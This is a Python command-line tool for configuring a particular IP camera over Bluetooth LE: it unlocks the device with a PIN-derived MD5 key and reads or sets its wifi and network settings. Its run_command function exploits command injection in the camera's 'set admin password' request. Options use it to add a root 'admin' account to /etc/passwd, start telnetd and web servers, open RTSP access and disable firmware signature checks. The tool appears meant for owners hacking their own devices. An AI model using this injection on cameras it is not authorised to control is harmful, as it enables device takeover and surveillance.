#!/usr/bin/python3
#
# SPDX-License-Identifier: GPL-2.0
# Copyright(c) 2019 Bjørn Mork <bjorn@mork.no>

import sys
import argparse
import base64
import hashlib
from bluepy.btle import Peripheral

VERSION = "0.02"

# helper converting "K=V;L=W;.." strings to { "K": "V", "L": "W". ...} dicts
def kv2dict(kvstr, sep=";"):
    result = {}
    for x in kvstr.split(sep, 50):
        (k, v) = x.split("=", 2)
        result[k] = v
    return result

class BleCam(object):
    locked = True
    
    def __init__(self, address, pincode):
        print("Connecting to %s..." % address)
        self.pincode = pincode
        self.periph = Peripheral(address)
        self._ipcamservice()
        self.name = self.periph.getCharacteristics(uuid=0x2a00)[0].read().decode() # wellknown name characteristic
        print("Connected to '%s'" % self.name)

    def _ipcamservice(self):
        try:
            print("Verifying IPCam service")
            self.service = self.periph.getServiceByUUID(0xd001)
            self.handles = self.service.getCharacteristics()
        except BTLEEException:
            print("no IPCam service found for %s" % periph.address)

    def dumpchars(self):
        print("%s supports these characteristics:" % self.name)
        for h in self.handles:
            print("%s - Handle=%#06x (%s)" % (h.uuid, h.getHandle(), h.propertiesToString()))

    def unlock(self):
        if not self.locked:
            return True
        auth = self.service.getCharacteristics(0xa001)[0]
        state = kv2dict(auth.read().decode())

        # already unlocked?
        if state["M"] == 0:
            self.locked = False
            return True

        self.challenge = state["C"]
        hashit = self.name + self.pincode + self.challenge
        self.key = base64.b64encode(hashlib.md5(hashit.encode()).digest())[:16]
        try:
            auth.write("M=0;K=".encode() + self.key, True)
            self.locked = False
        except:
            print("ERROR: failed to unlock %s - wrong pincode?" % self.name)
        return not self.locked

    def get_ipconfig(self):
        if not self.unlock(): return
        return kv2dict(self.service.getCharacteristics(0xa104)[0].read().decode())

    def get_wificonfig(self):
        if not self.unlock(): return
        return kv2dict(self.service.getCharacteristics(0xa101)[0].read().decode())

    def wifilink(self):
        if not self.unlock(): return
        r = kv2dict(self.service.getCharacteristics(0xa103)[0].read().decode())
        return r["S"] == "1"

    def sysinfo(self):
        if not self.unlock(): return
        return kv2dict(self.service.getCharacteristics(0xa200)[0].read().decode())

    def setup_wifi(self, essid, passwd):
        for net in self.wifi_scan():
            if net["I"] == essid:
                cfg = "M=" + net["M"] + ";I=" + essid + ";S=" + net["S"] + ";E=" + net["E"] + ";K=" + passwd
                print("Will configure: %s" % cfg)
                self.service.getCharacteristics(0xa101)[0].write(cfg.encode(), True)
                self.service.getCharacteristics(0xa102)[0].write("C=1".encode(), True)
                return True
        print("%s cannot see the '%s' network" % (self.name, essid))
        return False
    
    def wifi_scan(self):
        def _wifi2dict(wifistr):
            return kv2dict(wifistr[2:], ",")
        
        if not self.unlock(): return
        print("%s is scanning for WiFi networks..." % self.name)
        scan = self.service.getCharacteristics(0xa100)[0]
        p = -1
        n = 0
        result = ""
        while p < n:
            t = scan.read().decode().split(";", 3)
            result = result + t[2]
            if not t[0].startswith("N=") or not t[1].startswith("P="):
                return
            n = int(t[0].split("=",2)[1])
            p = int(t[1].split("=",2)[1])
            # print("read page %d of %d" % (p, n))
        return map(_wifi2dict, result.split("&", 50))
                    
    def run_command(self, command):
        if not self.unlock(): return
        
        run = "P=" + self.pincode + ";N=" + self.pincode + "&&(" + command + ")&"
        if len(run) > 128:
            print("ERROR: command is too long")
            return
        print("Attempting to run '%s' on %s by abusing the 'set admin password' request" % (command, self.name))
        try:
            self.service.getCharacteristics(0xa201)[0].write(run.encode(), True)
        except:
            # try repeating with an empty password, which seems to be te initial state after factory reset
            run = "P=;N=" + self.pincode + "&&(" + command + ")&"
            try:
                self.service.getCharacteristics(0xa201)[0].write(run.encode(), True)
            except:
                print("ERROR: Failed - is the admin password different from the pincode?")
       
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="IPCam Bluetooth configuration tool.")
    parser.add_argument("address", help="IPCam Bluetooth MAC address (01:23:45:67:89:AB)")
    parser.add_argument("pincode", help="IPCam PIN Code (6 digits)")
    #parser.add_argument("-v", "--verbose", help="Verbose output", action="store_true")
    parser.add_argument("--essid", help="Connect to this WiFi network")
    parser.add_argument("--wifipw", help="Password for ESSID")
    parser.add_argument("--survey", help="List WiFi networks seen by the IPCam", action="store_true")
    parser.add_argument("--netconf", help="Print current network configuration", action="store_true")
    parser.add_argument("--sysinfo", help="Dump system configuration", action="store_true")
    parser.add_argument("--command", help="Run command on IPCam")
    parser.add_argument("--telnetd", help="Start telnet server on IPCam", action="store_true")
    parser.add_argument("--lighttpd", help="Start web server on IPCam", action="store_true")
    parser.add_argument("--rtsp", help="Enable access to RTSP server on IPCam", action="store_true")
    parser.add_argument("--unsignedfw", help="Allow unsigned firmware", action="store_true")
    parser.add_argument("--attrs", help="Dump IPCam GATT characteristics", action="store_true")
    parser.add_argument("-V", "--version", action="version", version="%(prog)s " + VERSION)
    args = parser.parse_args()

    cam = BleCam(args.address, args.pincode)
    if args.essid:
        wifiok = cam.setup_wifi(args.essid, args.wifipw)
    if args.netconf:
        print("wifi link is %s" % "Up" if cam.wifilink() else "Down")
        print("wifi config: %s" % cam.get_wificonfig())
        print("ip config: %s" % cam.get_ipconfig())
    if args.sysinfo:
        print(cam.sysinfo())
    if args.survey:
        for network in cam.wifi_scan():
            print(network)
    if args.command:
        cam.run_command(args.command)
    if args.telnetd:
        print("Adding the 'admin' user as an alias for 'root'")
        cam.run_command("grep -Eq ^admin: /etc/passwd||echo admin:x:0:0::/:/bin/sh >>/etc/passwd")
        print("Setting the 'admin' user password to '%s'"% args.pincode)
        cam.run_command("grep -Eq ^admin:x: /etc/passwd&&echo admin:" + args.pincode + "|chpasswd")
        print("Starting telnetd")
        cam.run_command("pidof telnetd||telnetd")
    if args.lighttpd:
        cam.run_command('[ "$(tdb get HTTPServer Enable_byte)" -eq "1" ]||tdb set HTTPServer Enable_byte=1')
        cam.run_command("/etc/rc.d/init.d/extra_lighttpd.sh start")
    if args.rtsp:
        cam.run_command('[ "$(tdb get RTPServer RejectExtIP_byte)" -eq "0" ]||tdb set RTPServer RejectExtIP_byte=0')
        cam.run_command('[ "$(tdb get RTPServer Authenticate_byte)" -eq "1" ]||tdb set RTPServer Authenticate_byte=1')
        cam.run_command("/etc/rc.d/init.d/firewall.sh reload&&/etc/rc.d/init.d/rtspd.sh restart")
    if args.unsignedfw:
        cam.run_command("tdb set SecureFW _TrustLevel_byte=0")
    if args.attrs:
       cam.dumpchars()
 
        
print("Done.")
